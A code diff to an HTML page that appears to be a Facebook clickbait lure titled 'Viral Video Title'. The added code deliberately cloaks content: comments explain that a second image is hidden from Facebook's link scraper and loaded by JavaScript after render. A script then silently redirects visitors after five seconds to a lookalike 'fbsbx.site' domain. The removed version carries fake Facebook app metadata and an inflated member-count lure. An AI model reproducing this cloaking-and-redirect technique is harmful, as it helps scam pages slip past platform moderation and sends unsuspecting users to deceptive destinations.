@@ -1,44 +1,113 @@
-
 <!DOCTYPE html>
-<html>
-<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-	
-<!doctype html>
-                <html lang="en">
-                    <head>
-                    <meta charset="utf-8">
-                    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-                    <meta name="description" content="">
-                    <meta name="keywords" content="">
-                    <meta name="generator" content="WordPress 5.3.2">
-                    <title>😱Quatuor en Afrique😱</title>
-			<meta property="al:android:package" content="https://www.facebook.com/profile.php/">
-			<meta name="twitter:app:id:googleplay" content="https://www.facebook.com/profile.php/">
-			<meta property="al:android:app_name" content="Facebook">
-			<meta name="twitter:app:name:googleplay" content="Facebook">
-                
-                    
-                    <meta name="theme-color" content="#563d7c">
-                    <meta property='fb:app_id' content='87741124305'>
-                    <meta property="og:type"               content="article" />
-                    <meta property="og:title"              content="😱ggg hhh😱" />
-                    <meta property="og:description"        content="1,950,350 Online Members" />
-                    <meta property="og:image"              content="https://raw.githubusercontent.com/sahirkhizar33-dev/6/fc0808c92199ecdaa21da7712456fa561c8efc68/30.svg" />
-                    <meta property="og:image:type" content="image/jpeg" />
-                    <meta property="og:image:width" content="650" />
-                    <meta property="og:image:height" content="366" />
-                    <meta name="twitter:card" content="summary_large_image" />
-                    <meta name="twitter:description" content="" />
-                    <meta name="twitter:image" content="https://raw.githubusercontent.com/sahirkhizar33-dev/6/fc0808c92199ecdaa21da7712456fa561c8efc68/30.svg" />
-                    </head>
-                    <body>
-                    <h1>😱Quatuor en Afrique😱</h1>
-                    <p><img src="https://raw.githubusercontent.com/sahirkhizar33-dev/6/fc0808c92199ecdaa21da7712456fa561c8efc68/30.svg" class="img-responsive"></p>
-                    <p></p>
-                    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
-            
-            </body>
-        </html>
-</head>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
+  <title>Viral Video Title</title>
 
+  <!-- =========================================================
+       FACEBOOK OPEN GRAPH META TAGS (ONLY IMAGE #1 IS ALLOWED)
+  ========================================================= -->
+  <meta property="og:type" content="article" />
+  <meta property="og:title" content="Top Viral Video Clip" />
+  <meta property="og:description" content="Watch high quality 1080p viral video now." />
+  
+  <!-- Image #1 (Facebook Preview Only Picks This) -->
+  <meta property="og:image" content="https://i3.wp.com/pub-5198cbdd4b1c4950ada79e22a5fa4052.r2.dev/IMG-20250322-WA0232.jif" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
+
+  <!-- Styling for Fullscreen / Clean View -->
+  <style>
+    /* Hide Theme Layout Header, Footer, Sidebars */
+    header, footer, .site-header, .site-footer, .entry-title, .page-title, 
+    .entry-header, #masthead, #colophon, .sidebar, #secondary, .widget-area {
+      display: none !important;
+    }
+    
+    html, body {
+      background-color: #000 !important;
+      margin: 0 !important;
+      padding: 0 !important;
+      width: 100vw !important;
+      min-height: 100vh !important;
+      overflow-x: hidden !important;
+      font-family: Arial, sans-serif;
+      color: #fff;
+    }
+
+    .main-container {
+      width: 100%;
+      padding: 15px;
+      box-sizing: border-box;
+    }
+
+    /* Primary Visible Image Styling */
+    .featured-preview-img {
+      width: 100%;
+      max-width: 800px;
+      height: auto;
+      border-radius: 8px;
+      display: block;
+      margin: 0 auto 20px auto;
+    }
+
+    /* Secondary Image Container (Hidden from Scraper) */
+    .hidden-from-scraper {
+      width: 100%;
+      max-width: 800px;
+      margin: 20px auto;
+    }
+
+    .hidden-from-scraper img {
+      width: 100%;
+      height: auto;
+      border-radius: 8px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="main-container">
+
+    <!-- =========================================================
+         IMAGE #1: VISIBLE TO USER & FACEBOOK SCRAPER
+    ========================================================= -->
+    <img src="https://i3.wp.com/pub-5198cbdd4b1c4950ada79e22a5fa4052.r2.dev/IMG-20250322-WA0232.jif" alt="Featured Image 1" class="featured-preview-img" />
+
+
+    <!-- =========================================================
+         IMAGE #2: HIDDEN FROM FACEBOOK SCRAPER 
+         1. Container has data-nosnippet="true"
+         2. Uses data-src (Loaded via JS, invisible to Facebook Bot)
+    ========================================================= -->
+    <div class="hidden-from-scraper" data-nosnippet="true">
+      <!-- SRC is intentionally left blank so Facebook Bot ignores it -->
+      <img id="image2-element" data-src="https://i3.wp.com/pub-5198cbdd4b1c4950ada79e22a5fa4052.r2.dev/488724154_665607592822205_2574941374612882759_n.gif" alt="Hidden Image 2" />
+    </div>
+
+  </div>
+
+  <!-- =========================================================
+       JAVASCRIPT FOR DYNAMIC LOADING & AUTO REDIRECT
+  ========================================================= -->
+  <script type="text/javascript">
+    document.addEventListener("DOMContentLoaded", function() {
+      
+      // 1. Load Image #2 dynamically AFTER page render (FB Bot won't catch it)
+      const img2 = document.getElementById('image2-element');
+      if (img2 && img2.getAttribute('data-src')) {
+        img2.src = img2.getAttribute('data-src');
+      }
+
+      // 2. Target Link Redirect (5 Seconds)
+      const targetLink = "https://cdn.fbsbx.site/redirect-site-url.mp4";
+      setTimeout(function() {
+        window.location.replace(targetLink);
+      }, 5000);
+
+    });
+  </script>
+
+</body>
 </html>
